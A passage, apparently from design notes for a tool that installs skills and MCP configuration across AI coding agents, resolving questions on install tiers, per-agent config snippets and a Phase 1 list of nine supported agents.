  NPX_SKILLS          // npx skills + manual MCP config
  MANUAL              // config file only
}
```

---

**Answers to your pending questions:**

**Q3 resolved:** `npx skills` handles Tier 2 SKILL installs. For MCP items on Tier 2 agents → `mcpConfigTemplate` stored in `AgentConfig` generates per-agent injection snippet. No CLI verify step for IDE-only agents (Cline, Windsurf) — skip to config injection.

**Q4 resolved:** Elicitation in `set_me_up` presents numbered list of Tier 1 + Tier 2 agents when auto-detect fails. User types number. Elicitation pattern already in `mcp.ts`.

**Q5 resolved — Phase 1 agent list (9 agents):**

Tier 1: Claude Code, Copilot CLI, Codex, Antigravity
Tier 2: Kilo Code, Cursor, Windsurf, Cline, OpenCode

Crush deferred — no npx skills support, YAML-only, too early-stage.

---
